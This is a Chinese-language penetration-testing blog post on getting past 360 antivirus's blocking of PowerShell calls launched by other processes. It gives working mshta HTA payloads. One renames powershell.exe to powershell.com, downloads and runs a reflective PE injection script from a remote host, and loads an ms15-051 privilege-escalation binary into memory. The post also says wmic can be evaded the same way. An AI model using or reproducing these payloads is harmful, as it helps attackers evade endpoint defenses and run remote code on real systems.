---
title: "绕过 360 对 PowerShell 的拦截"
date: 2019-08-06T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['360','powershell']
categories: ['内网渗透','bypass']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


360 不拦截 PowerShell 本身的执行, 拦截的是其它进程对 powershell.exe 的调用.

以 mshta 为例.

<!--more-->

默认执行命令的 Payload.

```
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe"
self.close
</script>
<body>
</body>
</HEAD> 
</HTML> 
```

很显然是会被拦截的.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190806151651.png)

利用一点小 trick.

```
<HTML> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD> 
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -2000,-2000
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe", "C:/Windows/Temp/powershell.com", True
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "C:/Windows/Temp/powershell.com -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1:8000/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.1.1:8000/ms15-051.exe -ExeArgs whoami;cmd /c pause"""
self.close
</script>
<body>
</body>
</HEAD> 
</HTML> 
```

我们把位于系统目录中的 powershell.exe 复制到 Temp 目录下并重命名为 powershell.com, 然后通过 powershell.com 执行命令.

这里使用的是远程加载 PE 文件至内存中执行.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190806151831.png)

并不会被拦截.

实测中将程序改为任意其它文件名再执行都能够绕过 360 的拦截.

原因很简单, 360 把文件名写死了.

wmic 同理.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190806151929.png)

修改后.

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20190806152108.png)